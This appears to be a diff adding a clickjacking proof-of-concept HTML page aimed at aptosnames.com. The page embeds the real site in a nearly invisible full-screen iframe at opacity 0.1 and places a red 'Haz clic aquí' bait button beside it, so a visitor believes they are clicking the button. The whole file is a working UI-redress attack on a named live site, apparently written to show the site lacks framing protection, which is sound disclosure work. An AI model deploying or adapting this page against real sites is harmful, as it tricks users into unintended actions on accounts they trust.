@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Clickjacking PoC – aptosnames.com</title>
+    <style>
+      iframe {
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.1; /* hacer la página casi invisible */
+        z-index: 2;
+        position: absolute;
+      }
+
+      .bait {
+        position: absolute;
+        top: 100px;
+        left: 100px;
+        z-index: 3;
+        background-color: red;
+        padding: 20px;
+        font-size: 20px;
+        color: white;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Clickjacking PoC for aptosnames.com</h1>
+    <div class="bait">Haz clic aquí</div>
+    <iframe src="https://www.aptosnames.com"></iframe>
+  </body>
+</html>
